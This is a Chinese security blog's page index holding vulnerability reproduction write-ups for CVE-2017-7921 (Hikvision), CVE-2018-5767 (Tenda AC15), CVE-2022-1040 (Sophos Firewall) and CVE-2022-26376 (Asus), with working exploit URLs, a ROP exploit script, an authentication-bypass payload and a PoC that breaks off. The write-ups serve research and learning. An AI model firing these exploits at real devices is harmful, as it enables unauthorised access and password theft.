[{"content":"由于不可抗因素，以下的ctf不会提供二进制文件，并且一些文章的结构会有所缺失，请理解 ","permalink":"https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","summary":"由于不可抗因素，以下的ctf不会提供二进制文件，并且一些文章的结构会有所缺失，请理解 ","title":"[置顶] 注意事项"},{"content":"这里总结了一些可以快速使用的命令，并不会涉及原理，如果您使用这些命令后报错或者是没有达到效果，请不要在此过多的纠结 ","permalink":"https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","summary":"这里总结了一些可以快速使用的命令，并不会涉及原理，如果您使用这些命令后报错或者是没有达到效果，请不要在此过多的纠结 ","title":"[置顶] 注意事项"},{"content":"因为某些不可抗力，所以在您阅读以下文章时，会发现文章的结构有所缺失，请理解。 ","permalink":"https://jellyfish-pro.github.io/posts/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","summary":"因为某些不可抗力，所以在您阅读以下文章时，会发现文章的结构有所缺失，请理解。 ","title":"[置顶] 注意事项"},{"content":"CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞 漏洞简介 该漏洞存在于海康威视摄像头设备上，因为逻辑错误，导致没有判断用户名和密码。\n环境搭建 这里使用的是海康威视的摄像头设备(DS-2CD1301D-I)，因为这个设备没有telnet和ssh命令，所以无法远程直接连上去。因此这里是连接的串口，串口是由师兄之前测试其他漏洞的时候焊上去的，故这里不介绍如何连接串口。\n修改psh 连接串口后，也无法直接获取shell，因为海康威视自己写了一个shell名叫psh，如果直接启动设备的话，会直接取得psh，如下：\n![image-20230621114823502](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621114823502.png)\n如果想要绕过这个psh，我们则需要修改内核参数，拿到普通shell。\n首先我们ctrl+U进入设置：\n![image-20230621114837009](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621114837009.png)\n随后使用如下命令修改内核参数：\nHKVS # printenv bootargs bootargs=console=ttyS0,115200 root=/dev/ram0 mem=42M\rHKVS # setenv bootargs console=ttyS0,115200 root=/dev/ram0 mem=42M single\rHKVS # saveenv Saving Environment to SPI Flash...\rErasing SPI flash...Writing to SPI flash...done 修改后使用reset命令重启：\n![image-20230621115313493](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621115313493.png)\n需要注意的是，这里的内核还没有被加载，只是内核提供的一个手动启动内核的环境。因此我们在这里修改了psh后，再启动内核后，就可以获得正常的shell了。\n#!/bin/bash\rrm /bin/psh\rtouch /bin/psh\recho \u0026#34;#!/bin/bash\u0026#34; \u0026gt; /bin/psh\recho \u0026#34;/bin/bash\u0026#34; \u0026gt;\u0026gt; /bin/psh\rchmod +x /bin/psh 随后执行linuxrc内核就可以获得普通的shell：\n![image-20230621115422960](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621115422960.png)\n其实这个阶段如果不想手动修改psh的话，可以修改ip地址，使用挂载共享文件夹的方式，从共享文件夹中复制一个过来。\n传递文件 虽然现在我们获得了正常的shell，但是设备上的busybox是被严重阉割过的，以至于连wget和curl命令都没有，也没有scp命令。没有这些命令，应该怎么传递文件呢？\n我们可以使用nfs共享文件夹：\nmount -t nfs 192.168.110.30:/tmp/nfs /run -o nolock 随后把要传输的文件复制到共享文件夹就好了。\n漏洞分析 查找漏洞 通过以往的经验，我们首先去搜索poc中访问的地址：\nhttp://your-ip/Security/users?auth=YWRtaW46MTEK 注： YWRtaW46MTEK是admin:11的base64编码\n可以看到poc访问了一个*/Security/users的路径，那我们直接搜索有没有这个文件。其实是搜索不到的，甚至连Security*这个文件夹都搜索不到。\n既然搜不到文件，根据经验就应该去http中找一下。\n但是我们直接使用ps是看不到http相关的进程。这不是因为http没有启动，而是因为海康威视使用的是自己写的一套东西：/home/process/davinci\n这个东西里面有类似于htpp的功能，当然还有其他的功能，我们将其拿出来后，使用ida打开，并且搜索*/Security/users*字符串：\n![image-20230621153633353](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621153633353.png)\n来到交叉引用处，可以看到这里是一个比较：\n![image-20230621154312099](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621154312099.png)\n这里，很明显这里在比较访问的路径。\n分析到这里，都还是常规的问题，所以分析起来也比较方便。\n但恰恰问题就出现在了这个地方，因为如果按照这个地方进行分析的话，我们会发现无论怎么找，都找不到用户名和密码是在哪里处理的（就是找不到漏洞点）\n这是因为这个函数并不是处理用户名和密码的函数，这里我是通过gdb动态调试+ida分析，最后找到漏洞点的 ，这个过程就不写出来了，因为具体操作并不麻烦，只是需要ida对照着gdb一步一步跟随，十分的繁琐。也可以用ida的trace试一试。\n我们直接来到，出问题的函数：sub_537078\n![image-20230621174325974](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621174325974.png)\n这里就可以看到对poc中base64编码的解码。随后程序会goto LABEL_2\n而在goto LABEL_2中可以看到，程序又对poc中的path做了一次对比，很明显我们输入的path不符合这些路径，所以会进入最后的sub_544870函数\n![image-20230626094145261](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626094145261.png)\n这个函数就是拼接数据包，然后调用发包函数进行发包，用户信息就直接发送出来了。\n整个程序跟下来，实在是没找到用户名和密码在哪里检测过，不知道是我没找到还是海康威视压根就没写\n漏洞利用 第一步，获得摄像头用户信息： http://your-ip/Security/users?auth=YWRtaW46MTEK ![image-20230626105111751](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626105111751.png)\n这里可以看到这里有用户名的信息\n第二步：获取密码 上一步我们知道了用户名，那么现在我们要开始获得密码：\nhttp://your-ip/System/configurationFile?auth=YWRtaW46MTEK ![image-20230626110855536](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626110855536.png)\n会下载海康威视的配置文件，然后使用解码工具解码：\n首先打开工具：\n![image-20230626113641950](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626113641950.png)\n选择刚刚下载的配置文件，选择后会询问是加密配置还是被解密的配置。\n![image-20230626113705586](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626113705586.png)\n这里选择Encrypted：\n注意看顶部的提示\n![image-20230626113740524](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626113740524.png)\n然后点击解密：\n![image-20230626113819494](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626113819494.png)\n顶部提示解密成功，然后我们保存文件即可。\n最后使用可以查看hex文件的工具打开，搜索第一步获取的用户名，在用户名的附近就可以看到密码：\n![image-20230626114109272](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626114109272.png)\n**注意：**搜索用户名时，用户名可能不止会出现一次，列如下图，搜索用户名后出现了两个结果：\n![image-20230626114314173](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230626114314173.png)\n但是只有第二个的密码时正确的。\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","summary":"CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞 漏洞简介 该漏洞存在于海康威视摄像头设备上，因为逻辑错误，导致没有判断用户名和密码。\n环境搭建 这里使用的是海康威视的摄像头设备(DS-2CD1301D-I)，因为这个设备没有telnet和ssh命令，所以无法远程直接连上去。因此这里是连接的串口，串口是由师兄之前测试其他漏洞的时候焊上去的，故这里不介绍如何连接串口。\n修改psh 连接串口后，也无法直接获取shell，因为海康威视自己写了一个shell名叫psh，如果直接启动设备的话，会直接取得psh，如下：\n![image-20230621114823502](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621114823502.png)\n如果想要绕过这个psh，我们则需要修改内核参数，拿到普通shell。\n首先我们ctrl+U进入设置：\n![image-20230621114837009](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621114837009.png)\n随后使用如下命令修改内核参数：\nHKVS # printenv bootargs bootargs=console=ttyS0,115200 root=/dev/ram0 mem=42M\rHKVS # setenv bootargs console=ttyS0,115200 root=/dev/ram0 mem=42M single\rHKVS # saveenv Saving Environment to SPI Flash...\rErasing SPI flash...Writing to SPI flash...done 修改后使用reset命令重启：\n![image-20230621115313493](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621115313493.png)\n需要注意的是，这里的内核还没有被加载，只是内核提供的一个手动启动内核的环境。因此我们在这里修改了psh后，再启动内核后，就可以获得正常的shell了。\n#!/bin/bash\rrm /bin/psh\rtouch /bin/psh\recho \u0026#34;#!/bin/bash\u0026#34; \u0026gt; /bin/psh\recho \u0026#34;/bin/bash\u0026#34; \u0026gt;\u0026gt; /bin/psh\rchmod +x /bin/psh 随后执行linuxrc内核就可以获得普通的shell：\n![image-20230621115422960](/vuln/CVE-2017-7921 hakvision_bypass_rce.img/image-20230621115422960.png)\n其实这个阶段如果不想手动修改psh的话，可以修改ip地址，使用挂载共享文件夹的方式，从共享文件夹中复制一个过来。\n传递文件 虽然现在我们获得了正常的shell，但是设备上的busybox是被严重阉割过的，以至于连wget和curl命令都没有，也没有scp命令。没有这些命令，应该怎么传递文件呢？","title":"CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞"},{"content":"CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞\n环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）\n这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）\n环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi\n随后使用binwalk提取固件\nbinwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\r#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：\n通过检查一下busybox，目的是检查该固件需要的位数和架构：\narm架构，32位，小端。\n所以我们需要使用qemu-arm-static来拟真环境\nsudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./\n执行命令后，我们看到程序在 Welcome to ...处不动了。\n为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：\n通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。\n这里我们可以通过两个方法解决这个问题：\n给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：\nsudo apt install uml-utilities bridge-utils\rsudo brctl addbr br0\rsudo brctl addif br0 ens33\rsudo ifconfig br0 up\rsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功\n随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：\n其实这个报错的地点就在刚刚那个问题的下面：\n通过分析汇编，我们可以看到，解决掉刚刚的问题后，程序会跳转到下面进入一个叫做 ConnectCfm 的函数，然后检查返回值，如果检查通过则跳转，没通过就报错\n很明显我们这里没有检查通过，所以我们这里直接选择修改二进制文件：\n这里的逻辑大致为：\n函数结束，将返回值放入r0 将r0让如r3 比较r3是否为0 如果不是0则跳转，如果是则继续运行报错 所以我们这里直接选择将上面的 mov r3,r0 改为 mov r3,#1，这样就能保证r3不为0了。\n这里我选择的是ida的 patch功能+在线arm翻译。当然也有很多patch功能的ida插件，大家可以自行选用\n改完之后记得点 Apply patches to input file...\n然后覆盖之前的httpd二进制，就可以顺利的启动了：\n访问 http://192.168.52.128/goform/getProduct\n说明环境已经模拟成功了\n漏洞分析 首先我们找到网上的poc：\n#python3\rimport requests\rurl = \u0026#34;http://192.168.52.128/goform/xxx\u0026#34;\rcookie = {\u0026#34;Cookie\u0026#34;:\u0026#34;password=\u0026#34;+\u0026#34;A\u0026#34;*1000}\rrequests.get(url=url, cookies=cookie) 分析poc，我们可以知道漏洞大概出现在对cookie字段进行分析的代码中\n我们首先在gdb中调试一下这个poc：\n使用以下命令重新打开httpd：\nsudo ./qemu-arm-static -L . -g 1234 ./bin/httpd\r# 1234就是qemu监听的调试端口，只需将ida或者gdb等连接到该端口即可进行调试 然后在另一边使用gdb-multiarch打开httpd，链接1234端口\nsudo gdb-multiarch ./bin/httpd\rtarget remote :1234 就可以进行调试了\n这里我们首先让程序跑起来，然后发送poc\n查看gdb时，发现gdb已经 Segmentation fault了\n这时我们查看一下bt\n发现程序进入了strstr()，随后Segmentation fault\n根据poc和bt的信息，我们可以猜测溢出点是在strstr()函数读取cookie或者password=时，所以我们通过ida进行字符串查找符合条件的地点：\n首先我们查找cookie，虽然能找到cookie字符串，但是在字符串出现的上下文中，没有找到strstr()函数的调用。\n然后我们查找password=，然后查看交叉调用，发现一个符合条件的地址：\n通过伪代码，我们可以看到，这里是把这里是在寻找password=和之后的内容，然后把 =和 ;之中的内容读取到 v31中。\n溢出点就在这里，v31的大小只有0x1c0，所以我们读取1000个字符，会造成溢出。\n漏洞利用 因为存在/x00截断，所以构造rop时，不能使用三个字节的地址。除非二进制文件本身足够大，否则只能去libc里找地址，如果同时libc开启了pie，那这个漏洞基本就没了\n因为我们要控制返回地址从而控制程序流，而现在的问题就是/x00截断。因为/x00截断，所以我们必须去libc中寻找四个字节的ROP地址。但是libc中又开启了PIE，但路由所提供的服务不能泄露libc的地址，因为这个基地址我们只能到路由设备上进行查看：\n查看的方法有两种：\n1.cat /proc/[pid]/maps\n2.在gdb中查看puts函数的地址，再减去puts函数在libc中的偏移\n我选择的是方法二，因为方法一查出来的libc基地址不准确，个人猜测是qemu模拟环境的问题\n然后puts在libc中的偏移量为 0x35cd4\n故基地址为 0x3fe1bcd4-0x35cd4=0x3fde6000\n随后我们寻找ROP：\n通过这两个指令我们可以看到：\n首先把puts放入r3，把下一条指令地址放入pc，随后将栈顶（参数）放入r0，然后跳转到函数\n故最后的exp：\nimport struct\rimport requests\rstring = \u0026#34;shoukaku\u0026#34;\rputs = 0x3fe1bcd4\rlibc_base = puts-0x35cd4\rpop_r3_pc = struct.pack(\u0026#39;\u0026lt;I\u0026#39;,libc_base + 0x00018298)\rmov_r0_ps = struct.pack(\u0026#34;\u0026lt;I\u0026#34;,libc_base + 0x00040cb8)\rpaylorad = b\u0026#39;a\u0026#39;*444+b\u0026#39;.png\u0026#39;+pop_r3_pc+struct.pack(\u0026#39;\u0026lt;I\u0026#39;, puts)+mov_r0_ps+string.encode()\rhead = {\r\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\u0026#34;,\r\u0026#34;Accept\u0026#34;:\u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#34;,\r\u0026#34;Cookie\u0026#34;:b\u0026#34;password=\u0026#34;+paylorad\r}\rrequests.get(url=\u0026#39;http://192.168.52.128/goform/hello\u0026#39;, headers=head) 最后成功的输出字符串\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","summary":"CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞\n环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）\n这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）\n环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi\n随后使用binwalk提取固件\nbinwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\r#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：\n通过检查一下busybox，目的是检查该固件需要的位数和架构：\narm架构，32位，小端。\n所以我们需要使用qemu-arm-static来拟真环境\nsudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./\n执行命令后，我们看到程序在 Welcome to ...处不动了。\n为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：\n通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。\n这里我们可以通过两个方法解决这个问题：\n给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：\nsudo apt install uml-utilities bridge-utils\rsudo brctl addbr br0\rsudo brctl addif br0 ens33\rsudo ifconfig br0 up\rsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功\n随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：","title":"CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现"},{"content":"漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。\n该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。\n环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。\n随后使用VMware打开.ova文件就可以直接搭建好sophos环境。\n不过这里需要注意一点就是网卡的配置：\nsophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：\n像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。\n这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0\n接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。\n第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。\n配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：\njson数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。\nsophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：\n通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。\nApache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。\nsophos中的perl是指向csc的：\n而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。\n这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。\n漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。\n我们可以使用一个简单例子：\n对于处理同样的数据：\n{ \u0026quot;name\\u0000ef\u0026quot;: \u0026quot;test\u0026quot;, \u0026quot;name\u0026quot;:\u0026quot;test2\u0026quot; }\n对于java来说：\nimport org.json.JSONObject;\rimport org.json.JSONException;\rimport java.io.*;\rclass test {\rpublic static void main(String[] args) {\rtry{\rSystem.out.println(new JSONObject(\u0026#34;{ \\\u0026#34;name\\\u0026#34;: \\\u0026#34;test\\\u0026#34;, \\\u0026#34;name\\\\u0000ef\\\u0026#34;: \\\u0026#34;test2\\\u0026#34;}\u0026#34;));\r}catch (JSONException e){\rSystem.out.println(e);\r}\r}\r} 其输出结果是：\n而对于json-c来说：\n#include \u0026lt;iostream\u0026gt;\r#include \u0026lt;json-c/json.h\u0026gt;\rint main() {\rauto jsonObj = json_tokener_parse(R\u0026#34;({ \u0026#34;name\\u0000ef\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;test2\u0026#34; })\u0026#34;);\rstd::cout \u0026lt;\u0026lt; json_object_to_json_string(jsonObj) \u0026lt;\u0026lt; std::endl;\rreturn 0;\r} 从两个结果，我们就可以看出差别：\n对于java而言， name\\u0000ef和 name是两个不同的key。\n但是对于json-c而言，name\\u0000ef和 name是相同的key，从而第二个值覆盖了第一个值。\njson数据流和认证绕过 上面我们从理论上介绍了这个漏洞原理，这里我们要看一 看sophos的代码究竟是如何让触发这个漏洞成为可能的。\n分析数据流 我们从sophos的登录包下手：\n我们可以看到这里访问的是 /webconsole/Controller,但是我们并没有在sophos在找到这个名叫 Controller的文件。所以我们怀疑这是一个 servlet。\n所以来到 /webconsole目录下，我们看到一个 web.xml，通过阅读，我们找到了 Controller要转发的类：\n找到这个类后，我们发现，这个类是处理 mode参数。\n#CyberoamCommonServlet.class\rpublic class CyberoamCommonServlet extends HttpServlet {\r//......\rprivate void _doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, int paramInt, SqlReader paramSqlReader) throws IOException, JSONException {\r//......\relse if (eventBean.getRequesttype() == 2) {\rString str = CSCClient.getTransactionID();\rtransactionBean.setTransactionID(str);\rCyberoamCustomHelper.process(httpServletRequest, paramHttpServletResponse, eventBean, transactionBean, paramSqlReader);\r}\r//......\r}\r}\r这里将mode参数传入 CyberoamCustomHelper.process方法中：\n#CyberoamCustomHelper.class\rpublic class CyberoamCustomHelper {\r//......\rpublic static void process(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, EventBean paramEventBean, TransactionBean paramTransactionBean, SqlReader paramSqlReader) {\r//......\rif (151 == paramEventBean.getMode()) {\rCSCClient cSCClient = new CSCClient();\rint k = cSCClient.generateAndSendAjaxEvent(paramHttpServletRequest, paramHttpServletResponse, paramEventBean,paramSqlReader);\rif (k == 200 || k == 201) {\r//...... 通过这段代码，我们就可以看到，这里调用了一个 cSCClient类中的 generateAndSendAjaxEvent，然后将用户密码都传入进去。\n最后返回了一个状态码，如果状态码为200，则表示登录成功。\n认证绕过 数据流分析到这里就很明显了，因为这里返回值为200，java就会认为登录成功。而登录具体的流程则由后面的csc进行处理。\n结合上面我们提到的漏洞产生的原因，故我们使用的poc为：\nmode=151\u0026amp;json=%7B%22mode%5Cu0000ef%22%3A259%2C%22username%22%3A%22admin%22%2C%22password%22%3A%22123456%22%2C%22languageid%22%3A%224%22%2C%22browser%22%3A%22Chrome_106%22%7D\u0026amp;__RequestType=ajax 解码后为：\nmode=151\u0026amp;json={\u0026#34;mode\\u0000ef\u0026#34;:259,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;,\u0026#34;languageid\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;browser\u0026#34;:\u0026#34;Chrome_106\u0026#34;}\u0026amp;__RequestType=ajax 通过这个poc，我们可以看到，这里有两个mode参数。第一个mode参数让java进入登录模块，第二个mode参数是在csc中让json-c覆盖掉之前的mode参数，从而让perl执行别的模块命令，从而返回200状态码。最后200状态码返回到java，java判断登录成功，漏洞利用成功。\n漏洞复现 我们利用burp抓取正常的登陆包：\n现在我们重新抓一个登录包，将data改为poc：\n可以看到已经登录成功了。\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","summary":"漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。\n该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。\n环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。\n随后使用VMware打开.ova文件就可以直接搭建好sophos环境。\n不过这里需要注意一点就是网卡的配置：\nsophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：\n像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。\n这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0\n接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。\n第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。\n配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：\njson数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。\nsophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：\n通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。\nApache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。\nsophos中的perl是指向csc的：\n而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。\n这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。\n漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。\n我们可以使用一个简单例子：\n对于处理同样的数据：\n{ \u0026quot;name\\u0000ef\u0026quot;: \u0026quot;test\u0026quot;, \u0026quot;name\u0026quot;:\u0026quot;test2\u0026quot; }\n对于java来说：\nimport org.json.JSONObject;\rimport org.json.JSONException;\rimport java.io.*;\rclass test {\rpublic static void main(String[] args) {\rtry{\rSystem.out.println(new JSONObject(\u0026#34;{ \\\u0026#34;name\\\u0026#34;: \\\u0026#34;test\\\u0026#34;, \\\u0026#34;name\\\\u0000ef\\\u0026#34;: \\\u0026#34;test2\\\u0026#34;}\u0026#34;));\r}catch (JSONException e){\rSystem.","title":"CVE-2022-1040 sophos身份验证绕过漏洞"},{"content":"CVE-2022-26376 华硕固件内存崩溃漏洞 漏洞简介 该漏洞存在于华硕固件和梅林固件中，不同型号对应的固件版本也不一致。如果想了解具体的型号，可以在NVD - CVE-2022-26376找到。\n根据塔洛斯的说法：\nA memory corruption vulnerability exists in the httpd unescape functionality of Asuswrt prior to 3.0.0.4.386_48706 and Asuswrt-Merlin New Gen prior to 386.7.. A specially-crafted HTTP request can lead to memory corruption. An attacker can send a network request to trigger this vulnerability.\n这个漏洞会导致内存损坏。通过研究确实可以造成溢出，但并不能控制程序流。简言之就是，这个漏洞会造成内存损坏，但难以被利用。\n漏洞分析 这里我使用的是梅林的386.5.2的源码\n这里就是漏洞点，程序的大致流程为，判断字符串s中有没有百分号，如果有就利用sscanf函数对百分号和百分号后的两位进行解码，并将解码后的字符放在原百分号的位置，随后使用strlcpy和strncpy来覆盖百分号后两个字符。例如字符%41%42：\n字符串中有百分号，使用sscanf函数对%41解码，并将解码出来的A放到原百分号的位置，字符变味了：A41%42 随后利用strlcpy将跳过**41将%42**放入s_tmp 最后，使用strncpy将%42接在A后面，原字符串就变为了：A%42 这就是一个解码url的循环。\n乍一看，确实没问题，但是问题是如果我们将%41%42改了%41%a的话，就会出现问题：\n第一轮解码，将会正常解析，字符串会变为：A%a\n但当解析%a时就会出问题：\n同样检测到百分号之后，使用sscanf函数对*%a进行解析，会解析为\\n*，随后放到百分号的位置，字符串变为：A\\na。 这时，strlcpy函数任然会读取原百分号（现在为\\n）后两个字节放到s_tmp中。 这里我们可以看到，字符串中\\n后只有一个字节（a）了。而strlcpy函数会读取\\n后两个字节，这就说明会发生读取越界。\n这里我们可以在设备上调试一下：\n#!/usr/bin/python3\rimport socket\rurl = b\u0026#34;GET /Main_Login.asp?ht=%41%a HTTP/1.1\\t\\n\u0026#34;\rurl += b\u0026#34;Host: 192.168.110.254\\t\\n\u0026#34;\rurl += b\u0026#34;Upgrade-Insecure-Requests: 1\\t\\n\u0026#34;\rurl += b\u0026#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36\\t\\n\u0026#34;\rurl += b\u0026#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\t\\n\u0026#34;\rurl += b\u0026#34;Referer: http://192.168.110.254/\\t\\n\u0026#34;\rurl += b\u0026#34;Accept-Encoding: gzip, deflate\\t\\n\u0026#34;\rurl += b\u0026#34;Accept-Language: zh-CN,zh;q=0.9\\t\\n\u0026#34;\rurl += b\u0026#34;Connection: close\\t\\n\\t\\n\u0026#34;\rs1 = socket.socket()\rs1.connect((\u0026#39;192.168.110.254\u0026#39;, 80))\rs1.send(url)\rtext = 